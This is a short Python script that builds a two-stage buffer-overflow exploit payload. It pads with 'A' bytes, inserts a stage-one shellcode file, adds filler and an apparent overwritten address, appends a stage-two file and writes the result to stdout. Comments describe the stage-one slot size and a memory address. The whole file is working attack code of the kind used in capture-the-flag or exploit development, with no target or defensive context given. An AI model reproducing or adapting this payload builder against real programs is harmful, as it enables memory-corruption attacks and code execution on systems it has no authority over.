import sys

size = 0x0400

sizechr = chr(size / 256) + chr(size % 256)

buf = chr(0x41) * 0xf6

# this is where stage 1 exploit goes
# there are 0x102 bytes for it to fit (number not exact, but 0x102 works)

fh = open('stage_1_cleaned', 'rb')
stage_1_cleaned = fh.read()
fh.close()

buf += stage_1_cleaned

buf += chr(0x3a) * 0x150

buf += (chr(0xff) + chr(0xf0))

sys.stdout.write(sizechr + buf + chr(0))

fh = open('stage_2', 'rb')
stage_2 = fh.read()
fh.close()

sys.stdout.write(stage_2 + chr(0x99))

# starts at effa